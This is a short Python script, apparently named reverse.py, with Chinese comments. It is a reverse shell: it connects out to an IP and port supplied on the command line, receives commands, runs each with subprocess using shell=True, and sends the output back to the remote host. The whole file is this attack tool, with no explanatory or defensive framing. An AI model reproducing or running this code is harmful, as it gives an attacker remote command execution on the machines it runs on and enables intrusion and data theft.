# -*- coding:utf-8 -*-
import os
import select
import socket
import sys
import subprocess

def ReserveConnect(addr, port):
    '''反弹连接shell'''
    try:
        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.connect((addr,port))
    except Exception as reason:
        print ('[-] Failed to Create Socket : %s'%reason)
        exit(0)
    rlist = [shell]
    wlist = []
    elist = [shell]
    while True:
        shell.send("cmd:")
        rs,ws,es = select.select(rlist,wlist,wlist)
        for sockfd in rs:
            if sockfd == shell:
                command = shell.recv(1024)
                if command == 'exit':
                    shell.close()
                    break
                result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()
                shell.sendall(result.decode("GB2312").encode("UTF-8"))

# 主函数运行
def run():
    if len(sys.argv)<3:
        print('Usage: python reverse.py [IP] [PORT]')
    else:
        url = sys.argv[1]
        port = int(sys.argv[2])
        ReserveConnect(url,port)

if __name__ == '__main__':
    run()
